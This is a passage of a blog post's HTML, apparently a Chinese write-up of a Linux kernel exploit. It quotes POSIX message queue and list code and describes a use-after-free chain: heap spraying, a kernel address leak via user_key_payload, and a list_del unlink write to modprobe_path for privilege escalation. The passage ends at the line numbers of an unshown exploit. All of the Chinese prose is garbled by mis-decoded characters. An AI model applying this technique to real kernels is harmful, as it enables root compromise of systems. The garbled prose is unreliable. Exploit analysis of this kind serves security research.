class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">wait.task = current;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* memory barrier not required, we hold info-&gt;lock */</span></span><br><span class="line">WRITE_ONCE(wait.state, STATE_NONE);</span><br><span class="line">ret = wq_sleep(info, RECV, timeout, &amp;wait);</span><br><span class="line">msg_ptr = wait.msg;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">msg_ptr = msg_get(info);</span><br><span class="line"></span><br><span class="line">inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime =</span><br><span class="line">current_time(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is now free space in queue. */</span></span><br><span class="line">pipelined_receive(&amp;wake_q, info);</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">ret = msg_ptr-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((u_msg_prio &amp;&amp; put_user(msg_ptr-&gt;m_type, u_msg_prio)) ||</span><br><span class="line">store_msg(u_msg_ptr, msg_ptr, msg_ptr-&gt;m_ts)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line">free_msg(msg_ptr);</span><br><span class="line">&#125;</span><br><span class="line">out_fput:</span><br><span class="line">fdput(f);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‹¿åˆ°<code>file_inode</code>ï¼Œæ¥ç€é€šè¿‡<code>msg_get</code>æ‹¿åˆ°å¯¹åº”çš„msg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct msg_msg *<span class="title">msg_get</span><span class="params">(struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">try_again:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * During insert, low priorities go to the left and high to the</span></span><br><span class="line"><span class="comment"> * right.  On receive, we want the highest priorities first, so</span></span><br><span class="line"><span class="comment"> * walk all the way to the right.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">parent = info-&gt;msg_tree_rightmost;</span><br><span class="line"><span class="keyword">if</span> (!parent) &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;no tree element, but supposedly messages &quot;</span></span><br><span class="line">     <span class="string">&quot;should exist!\n&quot;</span>);</span><br><span class="line">info-&gt;attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(&amp;leaf-&gt;msg_list))) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;empty leaf node but we haven&#x27;t implemented &quot;</span></span><br><span class="line">     <span class="string">&quot;lazy leaf delete!\n&quot;</span>);</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line"><span class="keyword">goto</span> try_again;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">msg = list_first_entry(&amp;leaf-&gt;msg_list,</span><br><span class="line">       struct msg_msg, m_list);</span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;leaf-&gt;msg_list)) &#123;</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info-&gt;attr.mq_curmsgs--;</span><br><span class="line">info-&gt;qsize -= msg-&gt;m_ts;</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšåé€šè¿‡<code>store_msg</code>å°†æ¶ˆæ¯å‘é€åˆ°ç”¨æˆ·æ€ï¼Œæœ€åå†<code>free</code>æ‰å¯¹åº”çš„msgç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_msg</span><span class="params">(struct msg_msg *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é‡Šæ”¾å‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°åœ¨å¼€å¤´ä½ç½®ä¼šé‡Šæ”¾æ‰<code>security</code>ä½†æ˜¯è¿™ä¸ªæ˜¯ä¸å¯æ§çš„ï¼Œå¦‚æœä¸ä¸º0å¤§æ¦‚ç‡ä¼šé€ æˆ<code>kernel panic</code>æ‰€ä»¥è¦ç¡®ä¿ä¸º0ã€‚å¹¶ä¸”å¯ä»¥çœ‹åˆ°è¿™é‡Œå¹¶æ²¡æœ‰åƒä»¥å‰é‚£æ ·å¯ä»¥ç”¨<code>MSG_COPY</code>æ¥è§£å†³ï¼Œå¹¶ä¸”åœ¨<code>copy_to_user</code>å‡½æ•°ä¸­ä¼šæ£€æµ‹è¯»å–å†…å®¹æ˜¯å¦è¶…è¿‡äº†å †å—å¤§å°æ‰€ä»¥æœ€å¤šè¯»å–<code>0x10</code>çš„å†…å®¹ï¼Œæ‰€ä»¥åªèƒ½å¯»æ±‚æ–°çš„æ–¹æ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯å‰é¢æåˆ°çš„<code>user_key_payload</code>ç»“æ„ä½“çš„å‰é¢<code>0x10</code>ä¸ªå­—èŠ‚å…¶å®æ˜¯å¦‚ä¸Šç»“æ„ä½“ï¼Œä»–çš„å‰å…«ä¸ªå­—èŠ‚é»˜è®¤ä¸º0ï¼Œå¹¶ä¸”funcæ˜¯æŒ‡å‘<code>user_free_payload_rcu</code>å‡½æ•°çš„ï¼Œæ‰€ä»¥ä¿è¯äº†<code>security</code>ä¸º0å¹¶ä¸”å¯ä»¥æˆåŠŸæ³„æ¼å‡ºå†…æ ¸åœ°å€ã€‚</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ç¡®ä¿<code>user_free_payload_rcu</code>ç»“æ„ä½“ç´§è´´<code>posix_msg_tree_node</code>ç»“æ„ä½“çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç”¨<code>io_uring</code>å ä½ï¼Œåœ¨ç”³è¯·ç¬¬äºŒä¸ª<code>expr</code>ä¹‹å‰é‡Šæ”¾æ‰ï¼Œè¿™æ˜¯å¤§æ¦‚ç‡å°±ä¼šæŒ¤åœ¨ä¸€èµ·äº†ï¼Œè¿™æ—¶åœ¨è¿›è¡Œå †å–·<code>user_free_payload_rcu</code>å³å¯å®ç°ã€‚</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è‡³æ­¤æ¥çœ‹çº¦æŸæ¡ä»¶è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œå¹¶ä¸èƒ½å®ç°ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä»»æ„åœ°å€å†™ï¼Œä¸è¿‡åœ¨ä»¥å¾€çš„ä¸€ç¯‡æ–‡ç« ä¸­ä»‹ç»è¿‡<code>modprobe_path</code>è¿™ä¸€ä¸ªå†…æ ¸å…¨å±€å˜é‡ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/7-1675211987.png"                      alt="ä¾µåˆ "                ></p><p>è¿™ä¸€æ­¥çš„æ„é€ æ–¹å¼å’Œä¸Šè¿°å…¶å®ç±»ä¼¼ï¼Œä¹Ÿæ˜¯é€šè¿‡å †å–·<code>posix_msg_tree_node</code>ç»“æ„ä½“å†é€šè¿‡<code>UAF</code>ä½¿å…¶æŒ‡å‘ä¸€ä¸ª<code>object</code>ï¼Œä¸è¿‡æœ€åå…¶æŒ‡å‘çš„<code>object</code>æ˜¯ä¼šè¢«<code>free</code>æ‰çš„ï¼Œé‚£ä¹ˆç´§æ¥ç€å †å–·<code>usr_key_payload</code>ç»“æ„ä½“ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“è¢«ä¸¤ä¸ª<code>usr_key_payload</code>ç»“æ„ä½“æ‰€è£¹æŒŸäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">next-&gt;prev = prev;</span><br><span class="line">WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del_entry(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_del_entry_valid(entry))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">__list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;next = LIST_POISON1;</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯»å–æ¶ˆæ¯æ—¶ä¼šè°ƒç”¨<code>msg_get</code>å‡½æ•°è·å–åˆ°<code>msg_msg</code>ç»“æ„ä½“ï¼Œå¹¶ä¸”åœ¨è·å–çš„æ—¶å€™ç´§è·Ÿç€çš„å°±æ˜¯<code>list_del</code>ä»é“¾è¡¨ä¸­åˆ é™¤æ‰ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­å‡ºç°äº†å¯¹æŒ‡é’ˆçš„æŒ‡é’ˆèµ‹å€¼çš„æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå…¶å®åœ¨ç”¨æˆ·æ€å †ä¸­çš„<code>unlink</code>çš„æ—¶å€™å°±å·²ç»æ¥è§¦è¿‡äº†ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>prev</code>å’Œ<code>next</code>é‚£ä¹ˆå°±å¯ä»¥å®ç°ä¸ä»»æ„åœ°å€å†™ä¸ä»»æ„å€¼äº†ï¼Œå…·ä½“è¦æ±‚è‚¯å®šå°±æ˜¯ä¿è¯ä¸¤ä¸ªæŒ‡é’ˆéƒ½æ˜¯å¯å†™çš„ã€‚é‚£ä¹ˆè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>0xffff????2f706d74</code>è¿›è¡Œå†™<code>modprobe_path</code>ä½ç½®ï¼Œæœ€ç»ˆçš„æ•ˆæœå°±ä¸º<code>/tmp/????xffxffprobe</code>ï¼Œè¿™çš„<code>????</code>æ˜¯å‰é¢æ³„æ¼å‡ºæ¥çš„å †åœ°å€ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>è¿™é‡Œexpå°±ç›´æ¥ç”¨ä»–çš„äº†( å› ä¸ºæˆ‘ä¹Ÿä¸ç†Ÿæ‚‰è¯¥æ¨¡å—æ‰€ä»¥å°±ç®—è‡ªå·±å†™ä¹Ÿä¼šå’Œä»–çš„å¤§å·®ä¸å·® )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span 